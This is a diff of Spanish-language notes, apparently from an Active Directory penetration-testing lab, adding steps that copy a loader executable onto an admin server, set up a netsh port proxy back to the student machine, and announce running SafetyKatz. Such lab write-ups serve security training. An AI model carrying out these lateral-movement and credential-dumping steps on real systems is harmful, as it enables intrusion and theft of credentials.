@@ -741,20 +741,24 @@ Lo haremos desde nuestra maquina estudiante, conectandonos a *adminsrv*
 winrs -r:dcorp-adminsrv cmd
 ```
 
-Forzaremos la actualizacion de las GPO
+Forzaremos la actualización de las GPO
 ```shell
 [dcorp-adminsrv]
 gpupdate /force
 ```
+
 Ahora copiaremos el *Loader* a la maquina
 ```shell
 [student97]
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe
 ```
 
+Haremos la redirección de puertos
+```shell
+[student97]
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97
+```
 
-
-
-
+Y ejecutaremos el *SafetyKatz*
 
 
